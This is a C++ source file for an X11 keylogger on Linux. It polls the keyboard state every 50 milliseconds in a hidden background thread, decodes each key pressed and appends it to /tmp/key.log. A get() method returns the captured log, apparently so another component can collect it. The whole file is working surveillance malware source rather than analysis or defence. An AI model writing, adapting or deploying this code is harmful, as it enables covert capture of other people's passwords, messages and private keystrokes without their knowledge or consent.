#include "keylogger.hpp"

#include <thread>
#include <chrono>
#include <fstream>

#include <stdio.h>
#include <stdlib.h>
#include <string.h>

int bit(unsigned char i)
{
	switch (i)
	{
		case 1: return 0;
		case 2: return 1;
		case 4: return 2;
		case 8: return 3;
		case 16: return 4;
		case 32: return 5;
		case 64: return 6;
		case 128: return 7;
		default: return -1;
	}
}

std::string get_diff(Display* display, char old_keymap[], char new_keymap[])
{
	for (int i = 0; i != 32; ++i) {
		if (old_keymap[i] != new_keymap[i]) {
			int bit_num = old_keymap[i] ^ new_keymap[i];
			int keycode = 8*i + bit(bit_num);
			char keysym = XkbKeycodeToKeysym(display, keycode, 0, 0);
			char *keyname = XKeysymToString(keysym);
			if ((old_keymap[i] ^ bit_num) != 0) {
				if (keyname) {
					return std::string(keyname);
				}
			}
		}
	}
	return "";
}

void Keylogger::keylogger()
{
	char keymap[32];
	char old_keymap[32];

	Display* display = XOpenDisplay(NULL);
	if (display == NULL) return;

	XQueryKeymap(display, keymap);
	while(!quit) {
		using namespace std::chrono_literals;
		std::this_thread::sleep_for(50ms);
		memcpy(old_keymap, keymap, 32);
		XQueryKeymap(display, keymap);

		std::string keyname = get_diff(display, old_keymap, keymap);
		if (!keyname.empty()) {
			auto logfile = std::ofstream("/tmp/key.log", std::ios::app);
			logfile << keyname;
			logfile.close();
		}
	}

	XCloseDisplay(display);
}

Keylogger *Keylogger::instance = nullptr;

bool Keylogger::start()
{
	if (instance) {
		return false;
	}

	instance = (Keylogger*)malloc(sizeof(Keylogger));
	*instance = Keylogger();

	std::thread thr([] () {
		instance->keylogger();
	});
	thr.detach();

	return true;
}

std::string Keylogger::get()
{
	std::ifstream log_file {"/tmp/key.log"};
	if (log_file) {
		std::string line, complete_log;
		while (std::getline(log_file, line)) {
			complete_log += line + '\n';
		}
		log_file.close();

		return complete_log;
	}
	return "";
}

bool Keylogger::stop()
{
	if (instance) {
		instance->quit = true;
		return true;
	}
	return false;
}

